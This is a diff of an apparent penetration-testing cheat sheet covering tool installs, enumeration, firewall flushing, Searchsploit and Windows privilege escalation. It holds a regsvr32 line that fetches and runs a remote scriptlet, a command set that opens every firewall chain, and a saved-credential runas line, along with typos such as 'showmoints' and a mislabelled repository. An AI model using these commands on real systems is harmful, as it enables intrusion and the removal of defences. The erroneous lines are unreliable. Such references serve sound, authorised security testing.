@@ -3,10 +3,10 @@
 ## Tools needed:
 Enum4linux:  `git clone -v https://github.com/portcullislabs/enum4linux /opt/enum4linux-git`\
 Nullinux:    `git clone -v https://github.com/m8r0wn/nullinux /opt/nullinux-git`\
-Install UserEnum_LDAP: `git clone -v https://github.com/sensepost/UserEnum /opt/UserEnum_LDAP`\
-OWA Toolkit EWS Brute: `git clone -v https://github.com/johnnyDEP/OWA-Toolkit /opt/OWA-Toolkit`\
-MailSniper: `git clone -v https://github.com/dafthack/MailSniper /opt/MailSniper`
-Sherlock: `git clone -v https://github.com/rasta-mouse/Sherlock /opt/Sherlock`
+Install UserEnum_LDAP: `git clone -v https://github.com/sensepost/UserEnum /opt/UserEnum_LDAP-git`\
+OWA Toolkit EWS Brute: `git clone -v https://github.com/johnnyDEP/OWA-Toolkit /opt/OWA-Toolkit-git`\
+MailSniper: `git clone -v https://github.com/dafthack/MailSniper /opt/MailSniper-git`\
+Sherlock: `git clone -v https://github.com/rasta-mouse/Watson /opt/Watson-git`
 
 ## Linux commands:
 
@@ -23,7 +23,7 @@ Search bash command history: `history | grep {condition}`\
 Use a bash loop to find the IP address behind each host:`for url in $(cat list.txt); do host $url; done`\
 Base64 decode linux: `echo -n "ZGVjb2RlIHRoaXM=" | base64 -d`\
 Decode Hexidecimal Encoded string: `echo -n "54 68 6973206973206120 68657820 656E636F 64656420 7374 7269 6E 67" | xxd -r -ps`\
-Mount NFS Share: `mount 10.10.10.45:/vol/nfsshare /mnt/nfs`
+Mount NFS Share: `Mount -t nfs 10.10.10.45:/vol/nfsshare /mnt/nfs`\
 Example bash stuff: `cat access.log | cut -d " " -f 1 | sort | uniq -c | wc -l`
 
 ## Windows/CMD commands:
@@ -85,13 +85,13 @@ Grab a packet capture on port 80: `tcpdump  -i ens0 -xxNNSs 1514 -w output.pcap`
 
 ### Flush, delete, accept all traffic:
 
-`sudo iptables -P INPUT ACCEPT\
-sudo iptables -P FORWARD ACCEPT\
-sudo iptables -P OUTPUT ACCEPT\
-sudo iptables -t nat -F\
-sudo iptables -t mangle -F\
-sudo iptables -F\
-sudo iptables -X`
+`sudo iptables -P INPUT ACCEPT`\
+`sudo iptables -P FORWARD ACCEPT`\
+`sudo iptables -P OUTPUT ACCEPT`\
+`sudo iptables -t nat -F`\
+`sudo iptables -t mangle -F`\
+`sudo iptables -F`\
+`sudo iptables -X`
 
 Just flush:     `iptables -F`\
 Clear counters: `iptables -Z`
@@ -165,9 +165,14 @@ Categories: `auth, broadcast, default, discovery, safe, version` \
 Update scripts: `--script-updatedb`
 Default: `-sC`
 Vulnerability: `--script vuln`
-Categories: auth, broadcast, brute, default, discovery, dos, exploit, external, fuzzer, intrusive, malvware, safe, version, vuln
+Categories: auth, broadcast, brute, default, discovery, dos, exploit, external, fuzzer, intrusive, malware, safe, version, vuln
 Example: `nmap --script "default and safe"`\
-RPC scripts: `nmap --script="rpc*" 10.10.10.33`
+RPC scripts: `nmap --script="rpc*" 10.10.10.33`\
+
+#### Searchsploit
+
+Copy the sploit to current folder: `searchsploit -m [sploit to copy]`\
+Update searchsploit: `searchsploit -u`\
 
 # Infrastructure hacking
 
@@ -219,6 +224,10 @@ Enumerate user using Finger: `finger -sl username@$IP`
 
 Telnet to SMTP server: `telnet {ip} {port}`\
 Commands: user, pass, list, retr
+
+### NFS TCP/UDP/111
+
+Show exported mounts: `showmoints -e $ip`
 
 ### Netbios TCP/135/138/139:
 
@@ -491,5 +500,5 @@ RegSvr32: `regsvr32.exe /s /n /u /i:http://server/file.sct scrobj.dll`\
 # Privesc
 
 ## Windows
-https://github.com/infosecn1nja/AD-Attack-Defense/blob/master/README.md#discovery
+https://github.com/infosecn1nja/AD-Attack-Defense/blob/master/README.md#discovery\
 Runas saved credentials: `runas /savecred /user:<domain\username> cmd.exe`\
